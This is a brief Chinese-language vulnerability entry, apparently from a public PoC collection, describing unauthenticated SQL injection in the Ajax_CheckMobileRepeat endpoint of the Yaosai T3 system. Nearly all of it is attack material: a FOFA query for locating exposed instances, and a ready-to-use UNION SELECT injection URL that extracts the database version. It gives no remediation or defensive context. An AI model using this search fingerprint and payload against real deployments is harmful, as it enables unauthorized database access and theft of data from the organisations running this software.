# 要塞T3系统接口Ajax_CheckMobileRepeat存在SQL注入漏洞

要塞T3系统接口Ajax_CheckMobileRepeat存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句。

## fofa

```javascript
body="/mlogin.htm?url=" || body="T3/MAIN/Login.aspx"
```

## poc

```javascript
http://ip/T3/Ajax/Ajax_CheckMobileRepeat.ashx?action=checkmobilerepeat&mobileNum=1%27%20UNION%20ALL%20SELECT%20NULL%2C%28SELECT%20%40%40version%29--%20aEdt
```
![image](https://github.com/user-attachments/assets/c8361f75-6795-4847-ab6a-2119a53e5dfb)
